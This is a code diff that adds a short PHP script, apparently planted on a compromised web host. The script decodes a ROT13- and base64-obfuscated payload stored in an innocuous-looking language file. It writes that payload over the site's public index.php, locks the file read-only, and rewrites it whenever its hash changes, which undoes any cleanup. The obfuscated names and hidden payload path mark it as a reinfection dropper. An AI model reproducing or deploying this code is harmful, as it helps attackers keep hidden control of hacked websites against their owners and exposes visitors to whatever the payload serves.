@@ -1,0 +1,20 @@
+<?php
+$ddscdws = "/home/btkpdiy1/public_html/index.php";
+$sdfdsdfh = "/home/btkpdiy1/jbrp.jogjabelajar.org/application/language/english/12313";
+
+if (!file_exists($ddscdws) && file_exists($sdfdsdfh)) {
+    $iide = file_get_contents($sdfdsdfh);
+    $iide = base64_decode(str_rot13($iide));
+    @file_put_contents($ddscdws, $iide);
+    @chmod($ddscdws, 0444);
+}
+if (file_exists($ddscdws) && file_exists($sdfdsdfh)) {
+    $acdfadfasf = file_get_contents($ddscdws);
+    $iide = file_get_contents($sdfdsdfh);
+    $iide = base64_decode(str_rot13($iide));
+    if (md5($acdfadfasf) != md5($iide)) {
+        @chmod($ddscdws, 0644);
+        @file_put_contents($ddscdws, $iide);
+        @chmod($ddscdws, 0444);
+    }
+}
